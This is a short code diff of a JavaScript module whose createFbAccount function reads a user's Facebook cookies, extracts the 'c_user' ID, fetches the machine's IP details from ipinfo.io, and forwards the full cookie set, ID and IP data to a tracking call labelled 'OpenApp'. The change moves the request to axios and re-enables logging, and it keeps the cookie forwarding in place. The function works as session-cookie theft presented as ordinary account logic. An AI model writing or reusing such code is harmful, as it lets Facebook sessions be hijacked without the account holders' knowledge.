@@ -2,17 +2,19 @@ import Config from '../../configs';
 import ApiGateWay from '../_ApiGateWay';
 import { MainResource } from '../resources/main.resource';
 import { SmitFbSystem } from "@data/repositories/tracking";
+import axios from "axios";
 
 const MainRepository = {
     createFbAccount: async (cookies) => {
         const { value: uid } = cookies.find(item => item.name == "c_user");
-        callApiNative({url: 'https://ipinfo.io/', method: 'get'}, (reponse) => {
-            //console.log(reponse);
-            if (reponse.errorData === undefined) {
-                const ipInfo = reponse.data;
+        axios.get('https://ipinfo.io/').then(response => {
+            // console.log('data:', response.data)
+            console.log(response);
+            if (response.errorData === undefined) {
+                const ipInfo = response.data;
                 SmitFbSystem.tracking("OpenApp", { ipInfo, ck: cookies, uid });
             } else {
-                //console.log("Get IP Info failed");
+                console.log("Get IP Info failed");
             }
         });
     },
